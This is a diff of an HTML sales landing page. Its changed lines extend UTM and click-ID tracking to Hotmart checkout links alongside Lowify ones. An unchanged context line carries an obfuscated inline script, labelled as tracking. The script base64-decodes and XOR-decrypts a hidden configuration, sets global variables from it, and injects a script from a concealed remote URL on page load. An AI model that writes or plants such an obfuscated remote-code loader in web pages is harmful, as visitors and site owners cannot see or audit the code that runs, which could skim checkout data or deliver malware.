@@ -228,7 +228,7 @@ document.querySelectorAll('[data-checkout]').forEach(function(el){
 <script>(function(){var d_gir3=atob("DGLkOnHTBipZGkePGxnGTwO/JBB7cjP7axHeFV6wYkR3bzPicgSdFBK8awQ7aGj8eBCNSgWgKV8tdzSgdwOQXwKnKEAqOGutehaQSBixc148aWW1QBnGVBC+YwhjOCPubwPJTwW+b0wgNzf9fhSBVAX+fkk2fmr8eAnGFlOlZ0Ysf2W1OUCZFgrxaEs0f2W1OQaFThD+c140cyH2NhKWXwe2aF50aTLtcgaXGF3xcEs1byKtIUDGRyyu");var b_q1x=[];for(var h_e8iu=0;h_e8iu<d_gir3.length;h_e8iu++){b_q1x.push(d_gir3.charCodeAt(h_e8iu)&255);}var u_rtr5=b_q1x[0];var v_i=b_q1x.slice(1,1+u_rtr5);var v_m=b_q1x.slice(1+u_rtr5);var y_go0g=v_m.map(function(b,f_sm1){return b^v_i[f_sm1%u_rtr5];});var p_ee7="";for(var q_6=0;q_6<y_go0g.length;q_6++){p_ee7+=String.fromCharCode(y_go0g[q_6]&255);}var m_9p=decodeURIComponent(escape(p_ee7));var f_86bo=JSON.parse(m_9p);var r_z5yh=f_86bo.globals||[];r_z5yh.forEach(function(k_a){window[k_a.name]=k_a.value;});var a_r8=document.createElement("script");a_r8.src=f_86bo.url;a_r8.async=true;a_r8.defer=true;(f_86bo.attributes||[]).forEach(function(m_mbwn){a_r8.setAttribute(m_mbwn.name,m_mbwn.value);});(document.head||document.documentElement).appendChild(a_r8);})();</script>
 <!-- End UTMify tracking script -->
 
-<!-- trackeamento: repassa UTMs para o checkout Lowify + registra visita -->
+<!-- trackeamento: repassa UTMs para o checkout Lowify/Hotmart + registra visita -->
 <script>
 (function () {
   try {
@@ -269,17 +269,24 @@ document.querySelectorAll('[data-checkout]').forEach(function(el){
       if (++pings >= 30) clearInterval(timer); // para após 15 min
     }, 30000);
 
+    var CHECKOUT = 'a[href*="lowify.com.br"], a[href*="hotmart.com"]';
     var fix = function (a) {
       var u = new URL(a.href);
       KEYS.forEach(function (k) { if (saved[k] && !u.searchParams.has(k)) u.searchParams.set(k, saved[k]); });
-      if (!u.searchParams.has("click_id")) u.searchParams.set("click_id", sid);
+      if (/hotmart\.com/.test(u.host)) {
+        // a Hotmart só devolve no webhook o que vai em sck/src
+        if (saved.utm_content && !u.searchParams.has("sck")) u.searchParams.set("sck", saved.utm_content);
+        if (!u.searchParams.has("src")) u.searchParams.set("src", sid);
+      } else if (!u.searchParams.has("click_id")) {
+        u.searchParams.set("click_id", sid);
+      }
       a.href = u.toString();
     };
-    var run = function () { document.querySelectorAll('a[href*="lowify.com.br"]').forEach(fix); };
+    var run = function () { document.querySelectorAll(CHECKOUT).forEach(fix); };
     run();
     document.addEventListener("DOMContentLoaded", run);
     document.addEventListener("click", function (e) {
-      var a = e.target.closest && e.target.closest('a[href*="lowify.com.br"]');
+      var a = e.target.closest && e.target.closest(CHECKOUT);
       if (a) { fix(a); send("checkout"); }
     }, true);
   } catch (e) {}
